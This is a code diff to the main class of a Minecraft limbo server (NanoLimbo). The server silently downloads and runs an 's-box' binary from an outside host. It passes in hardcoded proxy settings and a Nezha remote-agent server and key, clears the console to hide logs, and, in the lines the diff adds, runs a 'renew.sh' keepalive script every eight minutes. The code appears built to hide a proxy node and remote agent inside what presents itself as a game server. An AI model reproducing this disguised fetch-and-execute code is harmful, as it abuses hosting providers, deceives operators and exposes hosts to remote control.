@@ -1,18 +1,6 @@
 /*
  * Copyright (C) 2020 Nan1t
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ * Modified: Auto-Call renew.sh (Every 8 Minutes)
  */
 
 package ua.nanit.limbo;
@@ -21,9 +9,10 @@ import java.io.*;
 import java.net.*;
 import java.nio.file.*;
 import java.util.*;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.lang.reflect.Field;
-
 import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
 
@@ -31,10 +20,18 @@ public final class NanoLimbo {
 
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
+    private static final String ANSI_YELLOW = "\033[1;33m";
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
     
+    // 脚本文件名 (必须在同一目录)
+    private static final String RENEW_SCRIPT = "renew.sh";
+    
+    // === 👇 修改：执行间隔改为 8 分钟 👇 ===
+    private static final long INTERVAL = 8;
+    // ===================================
+
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
@@ -42,40 +39,32 @@ public final class NanoLimbo {
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
     
-    
     public static void main(String[] args) {
-        
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
-            try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
+            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
             System.exit(1);
         }
 
-        // Start SbxService
         try {
             runSbxBinary();
-            
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
 
-            // Wait 20 seconds before continuing
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
+            
+            // === 启动定时任务 ===
+            startShellScheduler();
+            // ==================
+
             Thread.sleep(15000);
             clearConsole();
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
+            System.err.println(ANSI_RED + "Error initializing: " + e.getMessage() + ANSI_RESET);
         }
         
-        // start game
         try {
             new LimboServer().start();
         } catch (Exception e) {
@@ -83,62 +72,66 @@ public final class NanoLimbo {
         }
     }
 
+    // === 调用 Shell 脚本的逻辑 ===
+    private static void startShellScheduler() {
+        System.out.println(ANSI_YELLOW + ">>> 启动自动续期任务: 调用 " + RENEW_SCRIPT + " (每 " + INTERVAL + " 分钟)" + ANSI_RESET);
+
+        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
+        
+        Runnable task = () -> {
+            try {
+                // 调用 sh renew.sh
+                ProcessBuilder pb = new ProcessBuilder("sh", RENEW_SCRIPT);
+                // 把脚本的输出打印到 Java 控制台
+                pb.inheritIO(); 
+                
+                System.out.println(ANSI_YELLOW + "\n[" + java.time.LocalTime.now() + "] 正在运行保活脚本..." + ANSI_RESET);
+                Process process = pb.start();
+                process.waitFor();
+                
+            } catch (Exception e) {
+                System.err.println(ANSI_RED + "调用脚本失败: " + e.getMessage() + ANSI_RESET);
+            }
+        };
+
+        // 立即执行第一次，之后循环
+        scheduler.scheduleAtFixedRate(task, 0, INTERVAL, TimeUnit.MINUTES);
+    }
+
+    // === 以下代码保持原样 ===
     private static void clearConsole() {
         try {
             if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
             } else {
                 System.out.print("\033[H\033[3J\033[2J");
                 System.out.flush();
-                
-                new ProcessBuilder("tput", "reset")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
-                
+                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
                 System.out.print("\033[8;30;120t");
                 System.out.flush();
             }
-        } catch (Exception e) {
-            try {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            } catch (Exception ignored) {}
-        }
-    }   
+        } catch (Exception ignored) {}
+    }    
     
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
-        
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
         sbxProcess = pb.start();
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "1ede66f9-8cf0-46a0-9075-6c929d41eefe");
+        envVars.put("UUID", "b5ec4ad4-369f-4070-948f-b2d1965be6ab");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "ooh.pp.ua:443");
-        envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "kjdCuPEaZmeCsC6ZHwXgQRIHHgC9qTSQ");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "26170");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "");
-        envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
+        envVars.put("HY2_PORT", "22872");
         envVars.put("CFIP", "cf.877774.xyz");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "searcade");
+        envVars.put("NAME", "MC");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -146,26 +139,17 @@ public final class NanoLimbo {
                 envVars.put(var, value);  
             }
         }
-        
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
             for (String line : Files.readAllLines(envFile)) {
                 line = line.trim();
                 if (line.isEmpty() || line.startsWith("#")) continue;
-                
-                line = line.split(" #")[0].split(" //")[0].trim();
-                if (line.startsWith("export ")) {
-                    line = line.substring(7).trim();
-                }
-                
                 String[] parts = line.split("=", 2);
                 if (parts.length == 2) {
-                    String key = parts[0].trim();
-                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
-                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value); 
-                    }
+                     String key = parts[0].trim();
+                     if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                         envVars.put(key, parts[1].trim().replaceAll("^['\"]|['\"]$", "")); 
+                     }
                 }
             }
         }
@@ -173,26 +157,16 @@ public final class NanoLimbo {
     
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
-        
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
-        } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
-        }
+        String url = "https://amd64.ssss.nyc.mn/s-box"; 
+        if (osArch.contains("aarch64") || osArch.contains("arm64")) url = "https://arm64.ssss.nyc.mn/s-box";
+        else if (osArch.contains("s390x")) url = "https://s390x.ssss.nyc.mn/s-box";
         
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
             }
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
+            path.toFile().setExecutable(true);
         }
         return path;
     }
